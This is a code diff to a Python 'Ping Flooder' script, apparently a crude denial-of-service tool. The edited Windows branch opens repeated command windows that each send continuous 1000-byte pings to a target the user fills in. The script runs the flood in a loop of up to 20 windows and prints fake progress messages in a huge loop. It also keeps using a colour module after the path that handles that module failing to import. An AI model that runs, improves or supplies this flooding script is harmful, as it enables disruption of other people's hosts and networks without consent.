@@ -13,6 +13,7 @@ import time
 import sys
 import platform
 
+
 ###system-check###
 
 try:
@@ -20,7 +21,8 @@ try:
 	import colorama
 	from colorama import Fore
 except ImportError:
-	print(Fore.RED + '[-] Failed to import an external module.')
+	print('[-] Failed to import an external module.')
+      
 	
 	if platform.system() == 'Linux':
 		print('    trying to install missing dependencies...')
@@ -50,7 +52,7 @@ if platform.system()== 'Linux':
 	print("Ping Flooder running on linux", '\n')
 if platform.system()== 'Windows':
 	print("Ping Flooder running on Windows")
-	print("Windows platform is currently unstable, expect errors...", '\n')
+	print("Windows is now full supported", '\n')
 power = "Power (1-50): "
 target = input(Fore.YELLOW + "Current target: yourtarget") #edit this line with you current target
 time.sleep(2)
@@ -65,7 +67,7 @@ def start():
 	if platform.system()== 'Windows':
 		for k in range(x):
 			
-			os.system("cmd ping yourtarget")
+			os.system("start C:\Windows\System32\cmd.exe /k ping -t -l 1000 yourtarget") #edit this line for changing target
 			
 	for k in range(1000000000):
 		print(Fore.GREEN + "[*] Sending 1000 bytes packets...", '\n')
@@ -84,8 +86,3 @@ if x>20:
 		sys.exit(1)
 if x<20:
 	start()
-
-
-
-
-
